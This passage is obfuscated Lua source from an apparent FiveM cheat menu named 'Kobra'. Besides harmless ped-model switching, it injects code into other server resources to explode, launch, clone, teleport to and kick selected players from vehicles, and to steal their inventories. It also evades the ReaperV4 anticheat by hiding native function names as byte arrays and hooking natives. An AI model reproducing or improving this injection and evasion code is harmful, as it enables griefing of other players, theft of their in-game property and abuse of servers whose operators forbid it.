                                    elseif selected == "News Cameraman" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Hunter" then pedModel = "a_m_m_hillbilly_02"
                                    elseif selected == "Hiker Male" then pedModel = "a_m_m_hiker_01"
                                    elseif selected == "Hiker Female" then pedModel = "a_f_m_hiker_01"
                                    elseif selected == "Golfer Male" then pedModel = "a_m_m_golfer_01"
                                    elseif selected == "Golfer Female" then pedModel = "a_f_m_golfer_01"
                                    elseif selected == "Tennis Player Male" then pedModel = "a_m_m_tennis_01"
                                    elseif selected == "Tennis Player Female" then pedModel = "a_f_m_tennis_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v384));end},{type="scrollable",label="Animal Peds",scrollType="onEnter",value=1,values={"Boar","Cat","Chicken","Chimp","Cow","Coyote","Crow","Deer","Dolphin","Fish","Hen","Humpback","Husky","Killer Whale","Mountain Lion","Pig","Pigeon","Poodle","Pug","Poodle","Rabbit","Rat","Retriever","Rhesus Monkey","Rottweiler","Seagull","Shepherd","Stingray","Tiger Shark","Hammerhead Shark","Cow","Cat2","Chickenhawk","Cormorant","Coyote2","Chimp2","Boar2","Deer2","Fish2","Husky2","Pug2","Poodle2","Retriever2","Shepherd2","Rat2","Rabbit2","Dolphin2","Killer Whale2","Mountain Lion2","Pig2","Seagull2","Stingray2","Tiger Shark2","Hammerhead Shark2"},onSelect=function(v385) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Boar" then
                                        pedModel = "a_c_boar"
                                    elseif selected == "Cat" then
                                        pedModel = "a_c_cat_01"
                                    elseif selected == "Chicken" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Chimp" then
                                        pedModel = "a_c_chimp"
                                    elseif selected == "Cow" then
                                        pedModel = "a_c_cow"
                                    elseif selected == "Coyote" then
                                        pedModel = "a_c_coyote"
                                    elseif selected == "Crow" then
                                        pedModel = "a_c_crow"
                                    elseif selected == "Deer" then
                                        pedModel = "a_c_deer"
                                    elseif selected == "Dolphin" then
                                        pedModel = "a_c_dolphin"
                                    elseif selected == "Fish" then
                                        pedModel = "a_c_fish"
                                    elseif selected == "Hen" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Humpback" then
                                        pedModel = "a_c_humpback"
                                    elseif selected == "Husky" then
                                        pedModel = "a_c_husky"
                                    elseif selected == "Killer Whale" then
                                        pedModel = "a_c_killerwhale"
                                    elseif selected == "Mountain Lion" then
                                        pedModel = "a_c_mtlion"
                                    elseif selected == "Pig" then
                                        pedModel = "a_c_pig"
                                    elseif selected == "Pigeon" then
                                        pedModel = "a_c_pigeon"
                                    elseif selected == "Poodle" then
                                        pedModel = "a_c_poodle"
                                    elseif selected == "Pug" then
                                        pedModel = "a_c_pug"
                                    elseif selected == "Rabbit" then
                                        pedModel = "a_c_rabbit_01"
                                    elseif selected == "Rat" then
                                        pedModel = "a_c_rat"
                                    elseif selected == "Retriever" then
                                        pedModel = "a_c_retriever"
                                    elseif selected == "Rhesus Monkey" then
                                        pedModel = "a_c_rhesus"
                                    elseif selected == "Rottweiler" then
                                        pedModel = "a_c_rottweiler"
                                    elseif selected == "Seagull" then
                                        pedModel = "a_c_seagull"
                                    elseif selected == "Shepherd" then
                                        pedModel = "a_c_shepherd"
                                    elseif selected == "Stingray" then
                                        pedModel = "a_c_stingray"
                                    elseif selected == "Tiger Shark" then
                                        pedModel = "a_c_sharktiger"
                                    elseif selected == "Hammerhead Shark" then
                                        pedModel = "a_c_sharkhammer"
                                    elseif selected == "Chickenhawk" then
                                        pedModel = "a_c_chickenhawk"
                                    elseif selected == "Cormorant" then
                                        pedModel = "a_c_cormorant"
                                    else
                                        pedModel = nil
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid animal selected: " .. tostring(selected))
                                    end
                                ]]):format(v385));end}}}}},{icon="",label="Server",type="subMenu",categories={{label="List",tabs={{type="button",label="Select Everyone"},{type="button",label="Un-Select Everyone"},{type="button",label="Clear Selection"},{type="divider",label="Nearby Players"}}},{label="Safe",tabs={{type="button",label="Teleport to Player",desc="This will teleport you to the selected player",onSelect=function() local v386=0 -0 ;local v387;while true do if (v386==(65 -(39 + 26))) then v387=nil;for v783,v784 in pairs(v27) do if v784 then v387=v783;break;end end v386=145 -(54 + 90) ;end if (v386==(199 -(45 + 153))) then if v387 then local v853=0 + 0 ;local v854;local v855;local v856;local v857;while true do if (v853==1) then v855=GetPlayerPed(v854);v856=GetEntityCoords(v855);v853=2;end if (v853==(552 -(457 + 95))) then v854=GetPlayerFromServerId(v387);if ((v854== -1) or  not DoesEntityExist(GetPlayerPed(v854))) then local v1217=0;while true do if (v1217==(1 + 0)) then v12:UpdateListMenu();return;end if (v1217==(0 -0)) then v281:Notify("error","Kobra","There was an error while trying to teleport to that player! (ERR:1)",7250 -4250 );v27[v387]=nil;v1217=3 -2 ;end end end v853=1;end if (v853==(2 + 1)) then SetEntityHeading(PlayerPedId(),v857);v281:Notify("success","Kobra",("You have teleported to %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v387)),v387),3000);break;end if (v853==(6 -4)) then v857=GetEntityHeading(v855);SetEntityCoords(PlayerPedId(),v856.x,v856.y,v856.z,false,false,false,false);v853=8 -5 ;end end else v281:Notify("error","Kobra","You must select a player to do this!",3748 -(485 + 263) );end break;end end end},{type="checkbox",label="Spectate Player",checked=false,desc="This will attempt to Spectate the player",onSelect=function(v388) local v389=707 -(575 + 132) ;local v390;while true do if (v389==(862 -(750 + 111))) then v281:HandleSpectateToggle(v390,v388);break;end if (v389==(1010 -(445 + 565))) then v390=nil;for v785,v786 in pairs(v27) do if v786 then v390=v785;break;end end v389=1 + 0 ;end end end},{type="button",label="Copy Appearance",desc="Copy Players Clothing",onSelect=function() local v391={};for v542,v543 in pairs(v27) do if v543 then v391[ #v391 + (1 -0) ]=v542;end end if ( #v391==0) then local v589=0 + 0 ;while true do if (v589==(310 -(189 + 121))) then v281:Notify("error","Kobra","You must select a player to do this!",743 + 2257 );return;end end end local v392=v391[1348 -(634 + 713) ];local v393=GetResourceState("ReaperV4")=="started" ;if v393 then MachoInjectThread(538 -(493 + 45) ,"any","",string.format([[
                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end
                                        local function findClientIdByServerId(sid)
                                            local players = _g(_b("GetActivePlayers"))()
                                            for _, pid in ipairs(players) do
                                                if _g(_b("GetPlayerServerId"))(pid) == sid then
                                                    return pid
                                                end
                                            end
                                            return -1
                                        end
                                        
                                        local function CopyClothing(targetSid)
                                            local clientId = findClientIdByServerId(targetSid)
                                            if clientId == -1 then
                                                print("CLIENT ID NOT FOUND!")
                                                return
                                            end
                                            
                                            local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                            local myPed = _g(_b("PlayerPedId"))()
                                            
                                            if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                                print("COPYING CLOTHING...")
                                                
                                                -- COPY EVERYTHING - NO CLONING!
                                                _g(_b("SetPedComponentVariation"))(myPed, 1, _g(_b("GetPedDrawableVariation"))(targetPed, 1), _g(_b("GetPedTextureVariation"))(targetPed, 1), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 3, _g(_b("GetPedDrawableVariation"))(targetPed, 3), _g(_b("GetPedTextureVariation"))(targetPed, 3), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 4, _g(_b("GetPedDrawableVariation"))(targetPed, 4), _g(_b("GetPedTextureVariation"))(targetPed, 4), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 6, _g(_b("GetPedDrawableVariation"))(targetPed, 6), _g(_b("GetPedTextureVariation"))(targetPed, 6), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 8, _g(_b("GetPedDrawableVariation"))(targetPed, 8), _g(_b("GetPedTextureVariation"))(targetPed, 8), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)
                                                
                                                -- Copy accessories
                                                _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)
                                                
                                                print("CLOTHING COPIED!")
                                            else
                                                print("PED NOT FOUND!")
                                            end
                                        end
                                        
                                        CopyClothing(%d)
                                    ]],v392));else local v590=0;local v591;local v592;local v593;local v594;local v595;while true do if (v590==(970 -(493 + 475))) then v595=nil;function v595(v898) local v899=0 + 0 ;local v900;local v901;local v902;while true do if ((786 -(158 + 626))==v899) then if (v593(v591("DoesEntityExist"))(v901) and v593(v591("DoesEntityExist"))(v902)) then print("^2[Kobra] Copying clothing from Server ID: "   .. v898   .. "^0" );v593(v591("SetPedComponentVariation"))(v902,1 + 0 ,v593(v591("GetPedDrawableVariation"))(v901,1),v593(v591("GetPedTextureVariation"))(v901,1),0 -0 );v593(v591("SetPedComponentVariation"))(v902,3,v593(v591("GetPedDrawableVariation"))(v901,3),v593(v591("GetPedTextureVariation"))(v901,1 + 2 ),0);v593(v591("SetPedComponentVariation"))(v902,1 + 3 ,v593(v591("GetPedDrawableVariation"))(v901,4),v593(v591("GetPedTextureVariation"))(v901,1095 -(1035 + 56) ),959 -(114 + 845) );v593(v591("SetPedComponentVariation"))(v902,3 + 3 ,v593(v591("GetPedDrawableVariation"))(v901,6),v593(v591("GetPedTextureVariation"))(v901,15 -9 ),0 + 0 );v593(v591("SetPedComponentVariation"))(v902,8,v593(v591("GetPedDrawableVariation"))(v901,8),v593(v591("GetPedTextureVariation"))(v901,1057 -(179 + 870) ),0);v593(v591("SetPedComponentVariation"))(v902,15 -4 ,v593(v591("GetPedDrawableVariation"))(v901,11),v593(v591("GetPedTextureVariation"))(v901,889 -(827 + 51) ),0 -0 );v593(v591("SetPedPropIndex"))(v902,0 + 0 ,v593(v591("GetPedPropIndex"))(v901,0),v593(v591("GetPedPropTextureIndex"))(v901,473 -(95 + 378) ),true);v593(v591("SetPedPropIndex"))(v902,1,v593(v591("GetPedPropIndex"))(v901,1 + 0 ),v593(v591("GetPedPropTextureIndex"))(v901,1 -0 ),true);v593(v591("SetPedPropIndex"))(v902,2 + 0 ,v593(v591("GetPedPropIndex"))(v901,1013 -(334 + 677) ),v593(v591("GetPedPropTextureIndex"))(v901,7 -5 ),true);print("^2[Kobra] Clothing copied successfully!^0");else print("^3[WARNING] Target or local ped does not exist.^0");end break;end if (v899==(1056 -(1049 + 7))) then v900=v594(v898);if (v900== -(4 -3)) then print("^1[ERROR] Client ID not found for Server ID: "   .. v898   .. "^0" );return;end v899=1 -0 ;end if (v899==(1 + 0)) then v901=v593(v591("GetPlayerPed"))(v900);v902=v593(v591("PlayerPedId"))();v899=5 -3 ;end end end v595(v392);break;end if (v590==(0 -0)) then v591=nil;function v591(v903) local v904=0;local v905;while true do if (v904==0) then v905={};for v1218=1 + 0 , #v903 do v905[v1218]=string.byte(v903,v1218);end v904=1421 -(1004 + 416) ;end if (v904==1) then return v905;end end end v592=nil;function v592(v906) local v907=0;local v908;while true do if (0==v907) then v908="";for v1220=1, #v906 do v908=v908   .. string.char(v906[v1220]) ;end v907=1958 -(1621 + 336) ;end if (v907==1) then return v908;end end end v590=1940 -(337 + 1602) ;end if (v590==(1518 -(1014 + 503))) then v593=nil;function v593(v909) local v910=1015 -(446 + 569) ;local v911;local v912;while true do if (v910==(0 + 0)) then v911=v592(v909);v912=_G[v911];v910=2 -1 ;end if (v910==1) then return v912;end end end v594=nil;function v594(v913) local v914=v593(v591("GetActivePlayers"))();for v975,v976 in ipairs(v914) do if (v593(v591("GetPlayerServerId"))(v976)==v913) then return v976;end end return  -1;end v590=1 + 1 ;end end end v281:Notify("success","Kobra","Copied clothing!",10384 -5384 );end},{type="button",label="Launch Player",desc="This will attempt to launch the player into the sky",onSelect=function() local v394=0 + 0 ;local v395;while true do if (v394==0) then v395={};for v787,v788 in pairs(v27) do if v788 then v395[ #v395 + 1 ]=v787;end end v394=506 -(223 + 282) ;end if ((1 + 1)==v394) then v281:Notify("success","Kobra","Attempting to TEST",5000);break;end if (v394==(1 -0)) then if ( #v395==(0 -0)) then local v858=670 -(623 + 47) ;while true do if (v858==(45 -(32 + 13))) then v281:Notify("error","Kobra","You must select a player to do this!",1682 + 1318 );return;end end end v281:HandleLaunchPlayer(v395);v394=2 + 0 ;end end end}}},{label="Risky",tabs={{type="button",label="Explode Player",desc="This will attempt to explode the player using a vehicle",onSelect=function() local v396={};for v544,v545 in pairs(v27) do if v545 then v396[ #v396 + (1405 -(1257 + 147)) ]=v544;end end if ( #v396==(0 + 0)) then v281:Notify("error","Kobra","You must select a player to do this!",5737 -2737 );return;end for v546,v547 in ipairs(v396) do local v548=133 -(98 + 35) ;local v549;local v550;while true do if (v548==(0 + 0)) then v549=v547;v550=GetPlayerFromServerId(v547);v548=3 -2 ;end if (v548==(3 -2)) then if ((v550== -(1 + 0)) or  not DoesEntityExist(GetPlayerPed(v550))) then v281:Notify("error","Kobra","You must select a player to do this!",2640 + 360 );v27[v547]=nil;return;else local v917=0 + 0 ;local v918;while true do if (v917==(557 -(395 + 162))) then v918=[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                local func = _G[decode(n)]
                                                if not func then
                                                    return nil
                                                end
                                                return func
                                            end
                                            local function wait(n)
                                                local waitFunc = g({87,97,105,116}) -- "Wait"
                                                if not waitFunc then
                                                    return
                                                end
                                                return waitFunc(n)
                                            end

                                            local vehicleName = decode({109,97,110,99,104,101,122}) -- "manchez"
                                            local requestModel = g({82,101,113,117,101,115,116,77,111,100,101,108})
                                            if not requestModel then return end
                                            requestModel(vehicleName)

                                            local hasModelLoaded = g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})
                                            if hasModelLoaded then
                                                local attempts = 0
                                                while not hasModelLoaded(vehicleName) and attempts < 20 do
                                                    wait(500)
                                                    attempts = attempts + 1
                                                end
                                                if attempts >= 20 then
                                                    return
                                                end
                                            end

                                            local getPlayerFromServerId = g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})
                                            if not getPlayerFromServerId then return end
                                            local targetPlayer = getPlayerFromServerId(]]   .. tostring(v549)   .. [[)
                                            if targetPlayer == -1 then
                                                return
                                            end

                                            local getPlayerPed = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                            if not getPlayerPed then return end
                                            local targetPed = getPlayerPed(targetPlayer)
                                            if not targetPed or targetPed == 0 then
                                                return
                                            end

                                            local localPlayerPed = getPlayerPed(-1) -- Get local player ped
                                            if not localPlayerPed or localPlayerPed == 0 then
                                                return
                                            end

                                            local getEntityCoords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})
                                            local getEntityHeading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})
                                            local setEntityHealth = g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})
                                            if not getEntityCoords or not getEntityHeading then return end
                                            local targetPos = getEntityCoords(targetPed)
                                            local heading = getEntityHeading(targetPed)

                                            local giveWeapon = g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})
                                            local setCurrentWeapon = g({83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110})
                                            local getHashKey = g({71,101,116,72,97,115,104,75,101,121})
                                            local shootBullet = g({83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115})
                                            local removeWeapon = g({82,101,109,111,118,101,87,101,97,112,111,110,70,114,111,109,80,101,100})
                                            local setMissionEntity = g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})

                                            local pistolHash = getHashKey(decode({87,69,65,80,79,78,95,65,80,80,73,83,84,79,76}))
                                            giveWeapon(localPlayerPed, pistolHash, 200, false, true)
                                            setCurrentWeapon(localPlayerPed, pistolHash, true)

                                            wait(1000) -- Wait 3 seconds before spawning vehicle

                                            local createVehicle = g({67,114,101,97,116,101,86,101,104,105,99,108,101})
                                            if not createVehicle then return end
                                            local vehicleSpawnPos = {x = targetPos.x + 2.0, y = targetPos.y, z = targetPos.z + 0.2} -- Offset 5 units, slight Z lift
                                            local vehicle = createVehicle(vehicleName, vehicleSpawnPos.x, vehicleSpawnPos.y, vehicleSpawnPos.z, heading, true, true)
                                            if not vehicle or vehicle == 0 then
                                                return
                                            end

                                            if setMissionEntity then
                                                setMissionEntity(vehicle, true, true)
                                            end
                                            if setEntityHealth then
                                                setEntityHealth(vehicle, 10) -- Set low health for easy explosion
                                            end

                                            for i = 1, 60 do
                                                local vehicleCoords = getEntityCoords(vehicle) -- Get updated vehicle coords each time
                                                shootBullet(
                                                    targetPos.x, targetPos.y, targetPos.z + 1.0, -- Start near target ped
                                                    vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 0.3, -- Aim at vehicle center (tighter offset)
                                                    2000.0, true, pistolHash, localPlayerPed, true, false, 2000.0 -- Higher speed for accuracy
                                                )
                                                wait(1) -- Slightly slower shooting for stability
                                            end

                                            removeWeapon(localPlayerPed, pistolHash)
                                        ]] ;MachoInjectResourceRaw("any",v918,v549);v917=1;end if (v917==1) then v281:Notify("success","Kobra","Attempting to Explode Player",5000);break;end end end break;end end end v12:UpdateListMenu();end},{type="button",label="Steal Inventory",desc="This will attempt to open the selected players inventory",onSelect=function() local v397={};for v551,v552 in pairs(v27) do if v552 then v397[ #v397 + (1942 -(816 + 1125)) ]=v551;end end if ( #v397==(0 -0)) then local v596=1148 -(701 + 447) ;while true do if (v596==(0 -0)) then v281:Notify("error","Kobra","You must select a player to do this!",3000);return;end end end v281:HandleTakeInventory(v397);v281:Notify("success","Kobra","Attempting to steal inventory",8740 -3740 );end},{type="divider",label="Ped Options"},{type="button",label="Clone Player",onSelect=function() local v398=0;local v399;while true do if (v398==(2 -1)) then if ( #v399==(0 -0)) then local v859=0 + 0 ;while true do if (v859==(0 + 0)) then v281:Notify("error","Kobra","You must select a player to do this!",10969 -7969 );return;end end end v281:HandleClonePlayer(v399);v398=1524 -(251 + 1271) ;end if (v398==(2 + 0)) then v281:Notify("success","Kobra","Cloned Player",5000);break;end if (v398==0) then v399={};for v789,v790 in pairs(v27) do if v790 then v399[ #v399 + (2 -1) ]=v789;end end v398=1;end end end},{type="button",label="Attack Clone Player",onSelect=function() local v400=0 -0 ;local v401;while true do if (2==v400) then v281:Notify("success","Kobra","Cloned Player",5000);break;end if (v400==(0 -0)) then v401={};for v791,v792 in pairs(v27) do if v792 then v401[ #v401 + (1260 -(1147 + 112)) ]=v791;end end v400=1 + 0 ;end if (v400==1) then if ( #v401==(0 -0)) then v281:Notify("error","Kobra","You must select a player to do this!",779 + 2221 );return;end v281:HandleAttackClonePlayer(v401);v400=699 -(335 + 362) ;end end end},{type="divider",label="Vehicle Options"},{type="scrollable",label="Attach Vehicle",scrollType="onEnter",value=1,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","kuruma","zentorno","entityxf","carbonizzare","elegy","massacro","vagner","nightshark","banshee","feltzer2","ruston","bullet","elegy2"},onSelect=function(v402) local v403=1166 -(228 + 938) ;local v404;while true do if ((686 -(332 + 353))==v403) then if ( #v404==(0 -0)) then v281:Notify("error","Kobra","You must select a player to do this!",7854 -4854 );return;end v12:AttachSelectedVehicle(v404,v402);v403=2 + 0 ;end if (v403==(2 + 0)) then v281:Notify("success","Kobra","Vehicle Attached to "   ..  #v404   .. " Player(s)" ,19995 -14995 );break;end if (v403==(423 -(18 + 405))) then v404={};for v793,v794 in pairs(v27) do if v794 then v404[ #v404 + 1 + 0 ]=v793;end end v403=1 + 0 ;end end end},{type="divider",label="Object Options"},{type="scrollable",label="Vehicle Object",scrollType="onEnter",value=979 -(194 + 784) ,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","zentorno","tampa","nightshark","kuruma","buffalo","massacro","ferrari","comet2","issi2","vindicator","baller","baller2"},onSelect=function(v405) local v406=0;local v407;while true do if (v406==(2 + 0)) then v12:SpawnSelectedObject(v407);break;end if (v406==1) then if ( #v407==0) then local v860=0 + 0 ;while true do if (v860==(0 + 0)) then v281:Notify("error","Kobra","You must select at least one player!",3889 -(844 + 45) );return;end end end v12.GetSelectedObjectModel=function(v795) return v405;end;v406=286 -(242 + 42) ;end if (v406==0) then v407={};for v796,v797 in pairs(v27) do if v797 then v407[ #v407 + (1 -0) ]=v796;end end v406=2 -1 ;end end end},{type="scrollable",label="Attach Prop",scrollType="onEnter",value=1 -0 ,values={"prop_barrel_02a","prop_cone_float_1","prop_chair_01a","prop_boombox_01","prop_tool_broom","prop_golf_ball","prop_laptop_01a","prop_trafficcone_01a","prop_pizza_box_01","prop_mb_cargo_01a","prop_ld_crate_01a","prop_ld_fueldoor","prop_ld_greenscreen_01","prop_ld_shovel","prop_snow_bottle","prop_snow_locker_01","prop_dummy_01","prop_dummy_02"},onSelect=function(v408) local v409=0 -0 ;local v410;while true do if (v409==(2 -1)) then if ( #v410==0) then v281:Notify("error","Kobra","You must select at least one player!",10250 -7250 );return;end v12.GetSelectedObjectModel=function(v798) return v408;end;v409=736 -(527 + 207) ;end if (v409==(529 -(187 + 340))) then v12:SpawnSelectedObject(v410);v281:Notify("success","Kobra","Spawned object '"   .. tostring(v408)   .. "' for "   ..  #v410   .. " player(s)." ,6870 -(1298 + 572) );break;end if (v409==0) then v410={};for v799,v800 in pairs(v27) do if v800 then v410[ #v410 + 1 ]=v799;end end v409=1;end end end},{type="scrollable",label="Attach Furniture",scrollType="onEnter",value=1,values={"prop_table_01","prop_table_02","prop_table_03","prop_chair_02","prop_chair_03","prop_chair_04a","prop_sofa_01","prop_sofa_02","prop_sofa_03","prop_bed_01","prop_bed_02","prop_lamp_01","prop_lamp_02","prop_lamp_03","prop_couch_01","prop_couch_02","prop_tv_01","prop_tv_02","prop_tv_03","prop_computer_01","prop_computer_02","prop_monitor_01","prop_monitor_02"},onSelect=function(v411) local v412=376 -(365 + 11) ;local v413;while true do if (v412==(1 + 0)) then if ( #v413==0) then local v861=0 -0 ;while true do if (v861==(0 -0)) then v281:Notify("error","Kobra","You must select at least one player!",3924 -(837 + 87) );return;end end end v12.GetSelectedObjectModel=function(v801) return v411;end;v412=3 -1 ;end if (v412==(1670 -(837 + 833))) then v413={};for v802,v803 in pairs(v27) do if v803 then v413[ #v413 + 1 + 0 ]=v802;end end v412=1388 -(356 + 1031) ;end if (v412==(1 + 1)) then v12:SpawnSelectedObject(v413);break;end end end},{type="scrollable",label="Attach Misc",scrollType="onEnter",value=1,values={"prop_beer_bottle","prop_soda_cup","prop_papercup_01","prop_cup_coffee_01","prop_champ_flute","prop_cs_burger_01","prop_cs_burger_02","prop_cs_hotdog_01","prop_cs_pizza_01","prop_cs_sandwich_01","prop_cs_juice_01"},onSelect=function(v414) local v415={};for v553,v554 in pairs(v27) do if v554 then v415[ #v415 + 1 ]=v553;end end if ( #v415==(0 + 0)) then local v597=0;while true do if (v597==(0 + 0)) then v281:Notify("error","Kobra","You must select at least one player!",3000);return;end end end v12.GetSelectedObjectModel=function(v555) return v414;end;v12:SpawnSelectedObject(v415);v281:Notify("success","Kobra","Spawned object '"   .. tostring(v414)   .. "' for "   ..  #v415   .. " player(s)." ,5000);end}}},{label="Vehicle",tabs={{type="button",label="Kick From Vehicle",onSelect=function() local v417=nil;for v556,v557 in pairs(v27) do if v557 then v417=v556;break;end end if v417 then local v598=260 -(197 + 63) ;local v599;while true do if (v598==(1 + 0)) then if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v599))) then local v977=0;while true do if ((0 + 0)==v977) then v281:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",1566 + 1434 );return;end end end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v1036=1 + 0 ,2 -0  do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function KickFromVehicleNewestV8(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        TaskLeaveVehicle(player, vehicle, 16)
                                                        Wait(450)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v599))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    KickFromVehicleNewestV8(entityHit)
                                                end
                                            end)
